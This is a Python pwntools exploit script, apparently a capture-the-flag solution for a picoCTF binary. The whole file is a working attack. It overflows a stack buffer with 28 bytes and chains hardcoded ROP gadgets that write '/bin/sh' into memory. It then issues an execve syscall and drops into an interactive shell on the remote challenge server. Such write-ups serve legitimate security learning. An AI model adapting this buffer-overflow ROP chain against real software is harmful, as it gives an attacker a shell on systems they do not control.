#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript = "b *vuln+59\nc")
    else:
        r = remote("saturn.picoctf.net", 57894)

    return r


def main():
    r = conn()

    r.recvline()
    
    payload = b'A' * 28 # overwrite stack variables and saved ebp, next 4 bytes will be saved eip

    # using ropgadget we find out that binary is statically linked
    # but there is no system or anything like that.
    # we do have whats needed to manually syscall execve and thats exactly what i'll do

    ADDR = 0x080e6d90 # some random addr from .bss to stick our /bin/sh to
    POP_EAX = 0x080b073a
    POP_ECX = 0x08049e29
    POP_EDX_POP_EBX = 0x080583b9
    MOV = 0x080590f2 # mov [edx], eax
    INT_80 = 0x8071640 # int 0x80


    #stick /bin/sh to memory
    payload += p32(POP_EDX_POP_EBX) + p32(ADDR) + p32(ADDR)
    payload += p32(POP_EAX) + b'/bin' + p32(MOV)
    payload += p32(POP_EDX_POP_EBX) + p32(ADDR+4) + p32(ADDR)
    payload += p32(POP_EAX) + b'/sh\x00' + p32(MOV)   

    #setup execve
    payload += p32(POP_EAX)
    payload += p32(0xb)
    payload += p32(POP_ECX)
    payload += p32(0)
    payload += p32(POP_EDX_POP_EBX) + p32(0) + p32(ADDR)
    payload += p32(INT_80)
    r.sendline(payload)


    r.interactive()


if __name__ == "__main__":
    main()
